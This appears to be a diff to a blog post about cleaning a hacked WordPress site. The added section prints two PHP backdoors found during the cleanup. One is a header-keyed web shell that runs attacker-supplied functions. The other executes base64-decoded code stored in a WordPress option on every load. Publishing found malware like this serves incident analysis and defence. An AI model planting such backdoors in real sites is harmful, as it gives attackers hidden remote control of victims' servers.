@@ -267,3 +267,12 @@ There's also these malicous files, called sidebar.php and footer.php, I chmod'd 
 locate sidebar.php | xargs grep bwinpoker
 locate footer.php | xargs grep bwinpoker
 {% endhighlight %}
+
+Here are the backdoors:
+{% highlight bash %}
+<? php if(@md5($_SERVER['HTTP_PATH'])==='5cd2973f835de94b560b62465d5a37f3'){ @extract($_REQUEST); @die($stime($mtime)); } ?> 
+{% endhighlight %}
+And
+{% highlight bash %}
+<?php add_action('init', create_function('', implode("\n", array_map("base64_decode", unserialize(get_option("wptheme_opt")))))); ?>
+{% endhighlight %}
